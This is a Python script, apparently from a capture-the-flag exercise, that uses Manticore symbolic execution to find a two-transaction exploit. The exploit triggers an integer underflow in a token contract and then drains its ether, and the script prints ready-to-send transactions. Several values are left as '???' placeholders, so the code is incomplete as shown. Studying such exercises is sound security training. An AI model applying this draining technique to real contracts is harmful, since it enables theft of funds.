'''
This level uses an exploit that requires two transactions to complete
The first transaction triggers the integer underflow and the second
    will drain the contract ether
This complicates the symbolic execution a lot
To simplify symbolic execution, a simpler token contract has been created
    This simpler contract functions exactly the same as the ctf level contract for our purposes
    and exploits on this simple contract can be used directly on the ctf level
When properly configured, this level should only take 2 minutes to solve on an n1 GCP instance
'''

from manticore.ethereum import ManticoreEVM
import binascii
import sys
import sha3

from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
sol_file = sys.argv[3] if len(sys.argv)>3 else "../SI_ctf_levels/SimpleToken.sol"
gas = 100000
contract_balance = ???
attacker_balance = ??? # this doesn't have to be your actual wallet balance, but must be enough to trigger the initial overflow exploit (10 szabo)
print("contract_balance",contract_balance,"attacker_balance",attacker_balance)

# read in the contract source
with open(sol_file, "r") as f:
    contract_src = f.read()

# instantiate manticore's Ethereum Virtual Machine
m = ManticoreEVM()

# create a virtual user account on the EVM
attacker_account = m.create_account(address=from_address, balance=attacker_balance)
# We separate the attacker/ctf accounts in this level
# If this weren't the case, our attacker could simply withdraw the tokens, which wouldn't be an interesting exploit
creator_account = m.create_account(address=0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef, balance=contract_balance)
# create our contract
contract_account = m.solidity_create_contract(
    contract_src, # a string containing the source file
    contract_name="SimpleToken", # the contract in the source file that we want to create (a file could have multiple contracts)
    owner=creator_account,
    balance=contract_balance, # the value to send to the contructor (this will actually be deducted from our virtual address)
    args=(0,0) # in the downloaded contract, these arguments aren't used
    )

# setup a symbolic value for manticore
sym_val = m.make_symbolic_value(256, name="val")
# sending a single null byte will trigger the default function
m.transaction(data=b"\x00", caller=attacker_account, address=contract_account.address, value=sym_val, gas=gas)

# setup a second transaction that will steal the ether in the contract
sym_args = m.make_symbolic_buffer(???, name="data")
m.transaction(???)

# for states that are still running (haven't reverted due to our transaction contraint) let's iterate through them and see if any allow for an exploit
for state in m.running_states:
    world = state.platform
    # we win if our balance is equal to our original balance plus the ether used to create the ctf level (this means we've recovered all the ether)
    if state.can_be_true(world.get_balance(attacker_account.address) == attacker_balance+contract_balance):
      state.constraints.add(world.get_balance(attacker_account.address) == attacker_balance+contract_balance)
      conc_val = state.solve_one(sym_val)
      conc_args = state.solve_one(sym_args)
      # print out our transaction
      print("eth.sendTransaction({value:\""+hex(conc_val)+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
      print("Found:")
      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(conc_args).decode('utf-8')+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
      # manticore doesn't seem to handle this type of exploit well... so I've written some extra code to calculate the correct value needed to win the level:
      correct_val = (attacker_balance+conc_val)*2
      correct_bytes = binascii.unhexlify('%064x' % correct_val)
      correct_buf = conc_args[:4]+correct_bytes
      print("Correct:")
      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(correct_buf).decode('utf-8')+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
      sys.exit(0) # we only needed one state!

print("No valid states found")
